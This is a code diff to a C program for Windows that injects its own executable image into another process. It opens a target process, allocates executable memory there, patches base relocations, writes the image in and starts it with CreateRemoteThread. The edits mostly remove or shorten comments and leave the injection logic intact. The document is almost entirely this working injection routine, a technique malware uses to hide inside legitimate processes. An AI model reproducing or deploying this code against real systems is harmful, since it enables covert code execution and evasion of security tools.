@@ -52,16 +52,15 @@ int main()
 	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
 	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
 
-	// Lay handle cua process muc tieu
+	
 	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
-
-	// Allote a new memory block in the target process. This is where we will be injecting this PE
 	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
+
 	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
 
-	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
+	// relocation
 	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 	DWORD relocationEntriesCount = 0;
 	PDWORD_PTR patchedAddress;
@@ -83,10 +82,8 @@ int main()
 		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
 	}
 
-	// Write the relocated localImage into the target process
-	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
 
-	// Start the injected PE inside the target process
+	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
 	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
 
 	return 0;
